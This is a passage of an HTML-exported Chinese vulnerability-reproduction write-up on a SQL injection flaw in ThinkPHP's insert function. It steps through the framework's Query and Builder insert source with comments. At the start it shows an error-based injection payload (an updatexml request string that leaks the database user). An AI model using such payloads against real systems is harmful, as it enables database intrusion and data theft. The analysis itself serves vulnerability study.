class="cm-variable">index</span><span class="cm-operator">?</span><span class="cm-variable">name</span>[<span class="cm-number">0</span>]<span class="cm-operator">=</span><span class="cm-variable">inc</span><span class="cm-operator">&amp;</span><span class="cm-variable">name</span>[<span class="cm-number">1</span>]<span class="cm-operator">=</span><span class="cm-variable">updatexml</span>(<span class="cm-number">1</span>,<span class="cm-variable">concat</span>(<span class="cm-number">0x7</span>,<span class="cm-variable">user</span>(),<span class="cm-number">0x7e</span>),<span class="cm-number">1</span>)<span class="cm-operator">&amp;</span><span class="cm-variable">name</span>[<span class="cm-number">2</span>]<span class="cm-operator">=</span><span class="cm-number">1</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 22px;"></div><div class="CodeMirror-gutters" style="height: 22px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre><h2 id='漏洞分析'><span>漏洞分析</span></h2><ol start='' ><li><p><span>因为是复现所以明确知道的是insert函数存在漏洞,接下来是分析</span></p></li><li><p><span>首先看自己定义的控制器的index函数</span></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211122140339648.png" referrerpolicy="no-referrer" alt="image-20211122140339648"></p></li><li><p><span>直接转到insert函数的定义在/thinkphp/library/think/db/Query.php文件下,这里自己尝试分析了一下</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.2px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>36</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">public</span> <span class="cm-keyword">function</span> <span class="cm-def">insert</span>(<span class="cm-keyword">array</span> <span class="cm-variable-2">$data</span> <span class="cm-operator">=</span> [], <span class="cm-variable-2">$replace</span> <span class="cm-operator">=</span> <span class="cm-atom">false</span>, <span class="cm-variable-2">$getLastInsID</span> <span class="cm-operator">=</span> <span class="cm-atom">false</span>, <span class="cm-variable-2">$sequence</span> <span class="cm-operator">=</span> <span class="cm-atom">null</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// 分析查询表达式</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$options</span> <span class="cm-operator">=</span> <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">parseExpress</span>(); <span class="cm-comment"># 分析我们写入的表达式是用来查询还是写入</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$data</span> &nbsp; &nbsp;<span class="cm-operator">=</span> <span class="cm-builtin">array_merge</span>(<span class="cm-variable-2">$options</span>[<span class="cm-string">'data'</span>], <span class="cm-variable-2">$data</span>); &nbsp;<span class="cm-comment"># 合并数组,$data是我们自己传入执行语句</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// 生成SQL语句</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$sql</span> <span class="cm-operator">=</span> <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">builder</span><span class="cm-operator">-&gt;</span><span class="cm-variable">insert</span>(<span class="cm-variable-2">$data</span>, <span class="cm-variable-2">$options</span>, <span class="cm-variable-2">$replace</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">//运行到这里的时候sql的值为"INSERT INTO `users` (`username`) VALUES (:data__username) "</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// 获取参数绑定</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$bind</span> <span class="cm-operator">=</span> <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">getBind</span>();</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  <span class="cm-tab" role="presentation" cm-text="">    </span><span class="cm-comment">//这里的参数绑定就是绑定:data_username</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-variable-2">$options</span>[<span class="cm-string">'fetch_sql'</span>]) { &nbsp;<span class="cm-comment">#这里$options['fetch_sql']值为false跳过</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// 获取实际执行的SQL语句</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">connection</span><span class="cm-operator">-&gt;</span><span class="cm-variable">getRealSql</span>(<span class="cm-variable-2">$sql</span>, <span class="cm-variable-2">$bind</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// 执行操作</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">18</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$result</span> <span class="cm-operator">=</span> <span class="cm-number">0</span> <span class="cm-operator">===</span> <span class="cm-variable-2">$sql</span> <span class="cm-operator">?</span> <span class="cm-number">0</span> : <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">execute</span>(<span class="cm-variable-2">$sql</span>, <span class="cm-variable-2">$bind</span>);<span class="cm-comment">#这里就是如果sql语句不为空就执行绑定参数的sql语句</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">19</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-variable-2">$result</span>) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">20</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$sequence</span> &nbsp;<span class="cm-operator">=</span> <span class="cm-variable-2">$sequence</span> <span class="cm-operator">?</span>: (<span class="cm-keyword">isset</span>(<span class="cm-variable-2">$options</span>[<span class="cm-string">'sequence'</span>]) <span class="cm-operator">?</span> <span class="cm-variable-2">$options</span>[<span class="cm-string">'sequence'</span>] : <span class="cm-atom">null</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">21</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$lastInsId</span> <span class="cm-operator">=</span> <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">getLastInsID</span>(<span class="cm-variable-2">$sequence</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">22</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-variable-2">$lastInsId</span>) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">23</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$pk</span> <span class="cm-operator">=</span> <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">getPk</span>(<span class="cm-variable-2">$options</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">24</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-builtin">is_string</span>(<span class="cm-variable-2">$pk</span>)) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">25</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$data</span>[<span class="cm-variable-2">$pk</span>] <span class="cm-operator">=</span> <span class="cm-variable-2">$lastInsId</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">26</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">27</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">28</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$options</span>[<span class="cm-string">'data'</span>] <span class="cm-operator">=</span> <span class="cm-variable-2">$data</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">29</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">trigger</span>(<span class="cm-string">'after_insert'</span>, <span class="cm-variable-2">$options</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">30</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">31</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-variable-2">$getLastInsID</span>) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">32</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable-2">$lastInsId</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">33</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">34</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">35</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable-2">$result</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">36</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 806px;"></div><div class="CodeMirror-gutters" style="height: 806px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre></li><li><p><span>接着我们跟进到</span><code>$sql = $this-&gt;builder-&gt;insert($data, $options, $replace);</code><span>的insert()函数</span></p><p><span>这里构造了我们最后要执行的sql语句,所以漏洞一般产生在这里</span></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="php" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.2px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>22</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">public</span> <span class="cm-keyword">function</span> <span class="cm-def">insert</span>(<span class="cm-keyword">array</span> <span class="cm-variable-2">$data</span>, <span class="cm-variable-2">$options</span> <span class="cm-operator">=</span> [], <span class="cm-variable-2">$replace</span> <span class="cm-operator">=</span> <span class="cm-atom">false</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// 分析并处理数据</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$data</span> <span class="cm-operator">=</span> <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">parseData</span>(<span class="cm-variable-2">$data</span>, <span class="cm-variable-2">$options</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-keyword">empty</span>(<span class="cm-variable-2">$data</span>)) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-number">0</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$fields</span> <span class="cm-operator">=</span> <span class="cm-builtin">array_keys</span>(<span class="cm-variable-2">$data</span>); &nbsp; &nbsp;<span class="cm-comment">#以数组形式返回$data数组的键</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$values</span> <span class="cm-operator">=</span> <span class="cm-builtin">array_values</span>(<span class="cm-variable-2">$data</span>); &nbsp;<span class="cm-comment">#以数组形式放回$data数组的值</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$sql</span> <span class="cm-operator">=</span> <span class="cm-builtin">str_replace</span>(</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  [<span class="cm-string">'%INSERT%'</span>, <span class="cm-string">'%TABLE%'</span>, <span class="cm-string">'%FIELD%'</span>, <span class="cm-string">'%DATA%'</span>, <span class="cm-string">'%COMMENT%'</span>],</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  [</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$replace</span> <span class="cm-operator">?</span> <span class="cm-string">'REPLACE'</span> : <span class="cm-string">'INSERT'</span>,</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">parseTable</span>(<span class="cm-variable-2">$options</span>[<span class="cm-string">'table'</span>], <span class="cm-variable-2">$options</span>),</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-builtin">implode</span>(<span class="cm-string">' , '</span>, <span class="cm-variable-2">$fields</span>),</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-builtin">implode</span>(<span class="cm-string">' , '</span>, <span class="cm-variable-2">$values</span>),</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">18</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">parseComment</span>(<span class="cm-variable-2">$options</span>[<span class="cm-string">'comment'</span>]),</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">19</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  ], <span 